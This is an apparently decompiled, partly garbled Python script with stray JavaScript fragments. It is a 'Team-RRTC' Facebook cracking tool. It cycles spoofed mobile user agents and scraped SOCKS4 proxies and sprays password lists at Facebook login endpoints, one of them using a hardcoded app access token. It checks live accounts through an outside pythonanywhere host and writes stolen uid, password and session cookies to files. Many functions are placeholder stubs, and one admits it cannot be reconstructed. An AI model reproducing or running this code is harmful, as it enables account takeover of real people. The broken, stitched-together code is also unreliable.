    budi = list(('SM-M236B', 'SM-A037G', 'SM-J701MT', 'SM-A115U', 'SM-G610M', 'SM-J530F', 'SM-A307FN', 'SM-A405FN', 'SM-S111DL', 'SM-A022F', 'SM-G900P', 'SM-G986U', 'SM-G981U', 'SM-G975U', 'SM-G981U', 'SM-G965F', 'SM-G970U1', 'SM-G965U', 'SM-G930T', 'SM-G930VL', 'SM-G950U', 'SM-G981U', 'SM-N975U', 'SM-G935U', 'SM-N960U', 'SM-G986U', 'SM-G930R4', 'SM-N960W', 'Xiaomi 10 Pro', '2201123G', '22071212AG', '22081212UG', '2112123AG', '2211133C', 'Mi 9T Pro', 'CPH1861', 'RMX3630', 'RMX3686', 'RMX1805', 'RMX1801', 'RMX2020', 'RMX1811', 'RMX3063', 'RMX3063', 'RMX3501', 'OPPO 1105', 'oppo 15', 'oppo6779', 'oppo6833', 'OPPO7273', 'Oppo A1', 'PCHM10', 'CPH2071', 'CPH2185', 'CPH2179', 'A37f', 'SM-G920F', 'Moto G', 'Moto X', 'Motorola Moto X', 'Moto G14', 'Moto G Stylus', 'NRD90M', 'MatePad Pro 11', 'nova 11 SE ', 'Mate 60 Pro+ ', 'Huawei Mate 20 Pro', 'Huawei P30 Lite', 'NRD90M', 'SM-T535', 'LRX22G', 'SM-T231', 'KOT49H', 'SM-J320F', 'LMY47V'))
    akagami1 = '[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307931;FBDM/{density=2.0,width=720,height=1369};FBLC/pt_BR;FBRV/281357705;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/' + str(random.choice(samsung)) + ';FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]'    
    akagami2 = '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2076};FBLC/de_DE;FBRV/278218861;FBCR/smartmobil.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/' + str(random.choice(budi)) + ';FBSV/10;FBOP/19;FBCA/arm64-v8a:;]'    
    akagami3 = '[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708667;FBDM/{density=3.0,width=1080,height=2043};FBLC/cs_CZ;FBRV/290555739;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/' + str(random.choice(redmi)) + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'    
    akagami4 = '[FBAN/FB4A;FBAV/301.0.0.37.477;FBBV/267342877;FBDM/{density=2.0,width=720,height=1424};FBLC/pl_PL;FBRV/268803887;FBCR/T-Mobile.pl;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/' + str(random.choice(oppo)) + ';FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'    
    akagami5 = '[FBAN/FB4A;FBAV/370.0.0.23.112;FBBV/374931191;FBDM/{density=3.0,width=1080,height=2153};FBLC/en_US;FBRV/0;FBCR/LV TELE2;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/' + str(random.choice(infinix)) + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]' 
    user = random.choice([akagami1, akagami2, akagami3, akagami4, akagami5])   
    trt = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';' + user   
    return trt
import requests
import sys
import random
import re
import time
def ____methodA____(ids, pasx, tl):
    ewe = requests.Session()
    ua = 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
    sys.stdout.write('\r\r' + '-' * tl + '〖' + 'RRTC-M1' + '〗-〖' + 'OK' + '〗-〖CP-' + str(cp) + '〗 ')
    sys.stdout.flush()    
    try:
        # Read proxy file
        with open('Proksi.txt', 'r') as pw:
            xx = pw.read().splitlines()       
        zz = random.choice(xx)
        if zz.startswith('http'):
            link = zz
        else:
            link = 'socks4://' + zz
        response = ewe.get('https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', 
                          proxies={'http': link, 'https': link})       
        m_ts = re.search('name="m_ts" value="(.*?)"', response.text).group(1)
        li = re.search('name="li" value="(.*?)"', response.text).group(1)
        jazoest = re.search('name="jazoest" value="(\\d+)"', response.text).group(1)
        lsd = re.search('name="lsd" value="(.*?)"', response.text).group(1)     
        chrome_version = re.search('Chrome/(\\d+).', ua).group(1)
        data = {
            'm_ts': m_ts,
            'li': li,
            'try_number': 0,
            'unrecognized_tries': 0,
            'email': ids,
            'prefill_contact_point': ids,
            'prefill_source': 'browser_dropdown',
            'prefill_type': 'contact_point',
            'first_prefill_source': 'browser_dropdown',
            'first_prefill_type': 'contact_point',
            'had_cp_prefilled': True,
            'had_password_prefilled': False,
            'is_smart_lock': False,
            'bi_xrwh': 0,
            'encpass': '#PWD_BROWSER:0:{}:{}'.format(str(time.time()).split('.')[0], pasx),
            'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
            'jazoest': jazoest,
            'lsd': lsd
        }        
        headers = {
            'Host': 'touch.facebook.com',
            'content-length': str(len(str(data))),
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(chrome_version, chrome_version),
            'sec-ch-ua-mobile': '?1',
            'user-agent': ua,
            'x-response-format': 'JSONStream',
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-lsd': lsd,
            'viewport-width': '360',
            'x-requested-with': 'XMLHttpRequest',
            'x-asbd-id': '129477',
            'dpr': '2',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua-platform': '"Android"',
            'accept': '*/*',
            'origin': 'https://touch.facebook.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }
        response = ewe.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',
                           data=data, headers=headers, allow_redirects=False, 
                           proxies={'http': link, 'https': link})       
        if 'checkpoint' in response.text:
            uid = re.search('3A(.*?)%', response.text).group(1)
            sys.stdout.write('\r' + '[' + 'RRTC-CP' + ']' + ' ' + uid + ' | ' + pasx)
            with open('/sdcard/RRTC-M1-RANDOM-CP.txt', 'a') as linex:
                linex.write(uid + '|' + pasx + '\n')            
            cp += 1
        else:
            kuki = []
            for key, value in ewe.cookies.get_dict().items():
                kuki.append(key + '=' + value)            
            if 'c_user' in ';'.join(kuki):
                uid = re.search('c_user=(.*);xs', ';'.join(kuki)).group(1)
                try:
                    response = ewe.get('https://mrrrtc143.pythonanywhere.com/live?uid=' + uid)
                    if 'LIVE' in response.text:
                        print('\r' + '[' + 'RRTC-OK' + ']' + ' ' + uid + ' -> ' + pasx + ' ' + 'COOKIES' + ' ' + ']' + '->' + ' ' + ';'.join(kuki))                        
                        with open('/sdcard/RRTC-M1-RANDOM-OK.txt', 'a') as linex:
                            linex.write(uid + '|' + pasx + '\n')                        
                        ok += 1
                except:
                    pass    
    except requests.exceptions.ConnectionError:
        time.sleep(15)
    except Exception as e:
        pass
import requests
import sys
import re
import random
import time
ewe = requests.Session()
ua = 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
sys.stdout.write(f'\r\r{xd}-{R}〖{G}RRTC-M1{R}〗-〖{W}{loop}{R}〗-〖{G}OK{R}-{G}{ok}{R}〗-〖CP-{R}{cp}{R}〗 ')
sys.stdout.flush()
for pw in pasx:
    xx = open('Proksi.txt', 'r').read().splitlines()
    zz = {'http': 'socks4://' + random.choice(xx)}    
    link = ewe.get('https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text   
    data = {
        'm_ts': re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
        'li': re.search('name="li" value="(.*?)"', str(link)).group(1),
        'try_number': 0,
        'unrecognized_tries': 0,
        'email': ids,
        'prefill_contact_point': ids,
        'prefill_source': 'browser_dropdown',
        'prefill_type': 'contact_point',
        'first_prefill_source': 'browser_dropdown',
        'first_prefill_type': 'contact_point',
        'had_cp_prefilled': True,
        'had_password_prefilled': False,
        'is_smart_lock': False,
        'bi_xrwh': 0,
        'encpass': '#PWD_BROWSER:0:{}:{}'.format(str(time.time()).split('.')[0], pw),
        'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
        'jazoest': re.search('name="jazoest" value="(\\d+)"', str(link)).group(1),
        'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1)}    
    headers = {
        'Host': 'touch.facebook.com',
        'content-length': str(len(data)),
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\\d+).', str(ua)).group(1), re.search('Chrome/(\\d+).', str(ua)).group(1)),
        'sec-ch-ua-mobile': '?1',
        'user-agent': __host__(),
        'x-response-format': 'JSONStream',
        'content-type': 'application/x-www-form-urlencoded',
        'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),
        'viewport-width': '360',
        'x-requested-with': 'XMLHttpRequest',
        'x-asbd-id': '129477',
        'dpr': '2',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua-platform': '"Android"',
        'accept': '*/*',
        'origin': 'https://touch.facebook.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}  
    response = ewe.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=data, headers=headers, allow_redirects=False, proxies=zz)
import requests
import re
import time
try:
    if 'checkpoint' in ewe.cookies.get_dict():
        uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
        print(f'\r{xd}-{R}[{Y}RRTC-CP{R}]{R} {uid} | {pw} ')
        open('/sdcard/RRTC-M1-RANDOM-CP.txt', 'a').write(uid + '|' + pw + '\n')
        cp += 1       
    elif 'c_user' in ewe.cookies.get_dict():
        kuki = ';'.join([f'{key}={value}' for key, value in ewe.cookies.get_dict().items()])
        uid = re.findall('c_user=(.*);xs', kuki)[0]
        response = str(requests.get(f'https://mrrrtc143.pythonanywhere.com/live?uid={uid}').text)
        if 'LIVE' in response:
            print(f'\r{R}[{G}RRTC-OK{R}]{G} -> {uid} | {pw} ')
            print(f'\r{R}[{G}COOKIES{R}]->{G} {kuki} ')
            linex()
            open('/sdcard/RRTC-M1-RANDOM-OK.txt', 'a').write(uid + '|' + pw + '|' + kuki + '\n')
            ok += 1
        else:
            pass
    else:
        pass
except requests.exceptions.ConnectionError:
    time.sleep(15)
loop += 1
import sys
import random
import string
import uuid
import requests
import json
def ____methodB____(ids, pasx, tl):
    """
    IMPORTANT: This is a partial reconstruction based on bytecode metadata only.
    The actual program logic cannot be determined from the provided information.
    """
    pw = None
    accessToken = None
    random_seed = None
    adid = None
    data = None
    headers = None
    url = None
    po = None
    uid = None
    coki = None
    response = None
    e = None
    potential_headers = {
        'User-Agent': None,  # Would be set to some value
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'graph.facebook.com',
        'X-FB-Net-HNI': '45204',
        'X-FB-SIM-HNI': '45201',
        'X-FB-Connection-Type': 'MOBILE.LTE',
        'X-Tigon-Is-Retry': 'False',}
    potential_url = 'https://graph.facebook.com/auth/login'
    raise NotImplementedError("Cannot reconstruct source code from bytecode metadata alone")
import sys
import random
import string
import uuid
import requests
def session_cookie_generator(session_cookies_list):
    """Generator that yields formatted cookie strings from session cookies"""
    for i in session_cookies_list:
        yield i['name'] + '=' + i['value']
def facebook_login_attempt(ids, pasx):
    """Main function that attempts Facebook login for given credentials"""
    sys.stdout.write(f'\r\r{xd}-{R}〖{G}RRTC-M2{R}〗-〖{W}{loop}{R}〗-〖{G}OK{R}-{G}{ok}{R}〗-〖CP-{R}{cp}{R}〗 ')
    sys.stdout.flush()
    for pw in pasx:
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        random_seed = random.Random()
        adid = ''.join(random_seed.choices(string.hexdigits, k=16))
        data = {
            'adid': adid,
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password',
            'error_detail_type': 'button_with_disabled',
            'source': 'device_based_login',
            'email': ids,
            'password': pw,
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'generate_session_cookies': '1',
            'meta_inf_fbmeta': '',
            'advertiser_id': '8b59ed89-4b88-4f69-a1ed-dfea59e76839',
            'currently_logged_in_userid': '0',
            'locale': 'en_US',
            'client_country_code': 'US',
            'method': 'auth.login',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            'api_key': '882a8490361da98702bf97a021ddc14d'}
        headers = {
            'User-Agent': xrrtc(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': '45204',
            'X-FB-SIM-HNI': '45201',
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'x-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
            'Content-Length': '698'}
        url = 'https://graph.facebook.com/auth/login'
        po = requests.post(url, data=data, headers=headers).json()
        if 'session_key' in po:
            uid = str(po['uid'])
            coki = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
            response = str(requests.get(f'https://mrrrtc143.pythonanywhere.com/live?uid={uid}').text)
            if 'LIVE' in response:
                print(f'\r{xd}-{R}[{G}RRTC-OK{R}]{G} {uid} | {pw} ')
                print(f'\r {R}[COOKIES{R}]{G} -> {kuki} ')
                linex()
                open('/sdcard/RRTC-M2-RANDOM-OK.txt', 'a').write(uid + '|' + pw + '|' + coki + '\n')
                ok.append(str(uid))
CONSTANTS = [
    'session_cookies',
    'https://mrrrtc143.pythonanywhere.com/live?uid=',
    'LIVE',
    '\r',
    '[',
    'RRTC-OK',
    ']',
    ' ',
    ' | ',
    '\r ',
    '[COOKIES',
    ' -> ',
    '/sdcard/RRTC-M2-RANDOM-OK.txt',
    'a',
    '|',
    '\n',
    'www.facebook.com',
    'error',
    'message',
    'error_data',
    'RRTC-CP',
    '/sdcard/RRTC-M2-RANDOM-CP.txt',
    1]
try:
    if 'www.facebook.com' in po['error']['message']:
        uid = po['error']['error_data']['uid']      
        print(f'\r{xd}-{R}[{Y}RRTC-CP{R}]{R} {uid} | {pw} ')
        with open('/sdcard/RRTC-M2-RANDOM-CP.txt', 'a') as f:
            f.write(uid + '|' + pw + '\n')
        cp.append(str(uid))
    loop += 1    
except Exception as e:
    pass
finally:
    e = None
    del e
import requests
import bs4
import json
import uuid
import os
import sys
import random
import datetime
import time
import re
import urllib3
import base64
import string
import platform
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime
import requests
import sys
import datetime
import os
import time
import os
import platform
import time
import sys
os.system('clear')
import os
import platform
import time
import sys
import requests
os.system('git pull --quiet 2>/dev/null')
bit = platform.architecture()[0]
if bit == '64bit':
    print('\x1b[38;5;196m[\x1b[1;97m➤\x1b[38;5;196m]\x1b[38;5;46m YOU ARE 64BIT USER')
    time.sleep(5)
elif bit == '32bit':
    print('\x1b[38;5;196m[\x1b[1;97m➤\x1b[38;5;196m]\x1b[38;5;46m YOU ARE 32BIT USER')
princp = []
id, user, rrtc, memek, loop, ok, cp = [], [], [], [], 0, 0, 0
prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
open('Proksi.txt', 'w').write(prox)
G = '\x1b[38;5;46m'
W = '\x1b[38;5;15m'
B = '\x1b[38;5;8m'
Y = '\x1b[38;5;226m'
A = '\x1b[38;5;123m'
R = '\x1b[38;5;160m'
O = '\x1b[38;5;81m'
X = '\x1b[38;5;205m'
P = '\x1b[0;34m'
dic = {'1': 'JANUARY', '2': 'FEBRUARY', '3': 'MARCH', '4': 'APRIL', '5': 'MAY', '6': 'JUNE', '7': 'JULY', '8': 'AUGUST', '9': 'SEPTEMBER', '10': 'OCTOBER', '11': 'NOVEMBER', '12': 'DECEMBER'}
sex1 = datetime.datetime.now().day
sex2 = dic[str(datetime.datetime.now().month)]
date = G + str(sex1) + W + '-' + G + str(sex2)
A = '\x1b[1;97m'
R = '\x1b[38;5;196m'
Y = '\x1b[1;35m'
G = '\x1b[38;5;46m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;48m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\x1b[1;34m'
X5 = '\x1b[38;5;14m'
W = '\x1b[38;5;123m'
P = '\x1b[38;5;122m'
T = '\x1b[38;5;86m'
U = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
G0 = '\x1b[38;5;46m'
G = '\x1b[1;32m'
W = '\x1b[1;97m'
R = '\x1b[38;5;160m'
B = '\x1b[1;90m'
Y = '\x1b[1;33m'
T = '\x1b[1;34m'
E = '\x1b[38;5;205m'
O = '\x1b[38;5;81m'
U = '\x1b[38;5;46m'
xd = ' ' + R + '〖' + G + '➤' + R + '〗' + G
xd1 = f'〗{G} '
xd2 = f'〖{G}2〗{R} '
xd3 = f'〖{G}3〗{R} '
xd4 = f' [{G}4]{R} '
xd5 = f' [{G}5]{R} '
xd6 = f' [{G}6]{R} '
import sys
R = "R_value"  # Placeholder for R
G = "G_value"  # Placeholder for G
A = "A_value"  # Placeholder for A
X5 = "X5_value"  # Placeholder for X5
xd0 = f'〖{R}0〗{G}'
xdx = f' {R}〖?{R}〗{G}'
sys.stdout.write('\x1b]2; TEAM - RRTC\x07')
def clear():
    pass  # Implementation of clear function
def linex():
    pass  # Implementation of linex function
lines = [
    '\n',
    A,
    'd8888b.  .d8b.  db   dD d888888b d8888b. \n',
    A,
    "88  `8D d8' `8b 88 ,8P'   `88'   88  `8D \n",
    X5,
    "88oobY' 88ooo88 88,8P      88    88oooY' \n",
    X5,
    '88`8b   88~~~88 88`8b      88    88~~~b. \n',
    A,
    '88 `88. 88   88 88 `88.   .88.   88   8D \n',
    A]

const result = [];
result.push("88   YD YP   YP YP   YD Y888888P Y8888P' ");
result.push(R);
result.push(`${R}`);
result.push('〘');
result.push(G5);
result.push(`${G5}`);
result.push(' rahmaN');
result.push(`${R}`);
result.push(' 〙\n');
result.push(A);
result.push(`${A}`);
result.push('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n ');
result.push(A);
result.push(`${A}`);
result.push('Owear    ');
result.push(R);
result.push(`${R}`);
result.push(' :');
result.push(A);
result.push(`${A}`);
result.push(' Rakib Rahman\n ');
result.push(A);
result.push(`${A}`);
result.push('Github   ');
result.push(R);
result.push(`${R}`);
result.push(' :');
result.push(A);
result.push(`${A}`);
result.push(' Team-Rrtc');
result.push(B);
result.push(`${B}`);
result.push('-');
result.push(A);
result.push(`${A}`);
result.push('143\n ');
result.push(A);
result.push(`${A}`);
result.push('Tools   ');
result.push(R);
result.push(`${R}`);
result.push('  :');
let logo = [
    ' Random\n ',
    A,
    'Status ',
    R,
    '   :',
    M,
    ' Free\n ',
    A,
    'Version  ',
    R,
    ' : ',
    A,
    '0',
    G1,
    '.',
    A,
    '1 \x1b[1;37m\n',
    A,
    '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
];
const XRRTC = function() {
    // Function implementation here
};
const ______randomxmenu_______ = function() {
    // Function implementation here
};
import os
def ______randomxmenu_______():
    pass  # placeholder
def xrrtc():
    pass  # placeholder
def RRTC():
    pass  # placeholder
def __host__():
    pass  # placeholder
def sava():
    pass  # placeholder
def ____methodA____():
    pass  # placeholder
def ____methodB____():
    pass  # placeholder
if __name__ == "__main__":
    XRRTC()
try:
    pass  # Placeholder for actual logic
except:
    try:
        os.system('pip uninstall requests -y;pip install requests')
    except Exception as e:
        print(e)
        e = None
        del e
    else:
        raise
else:
    raise

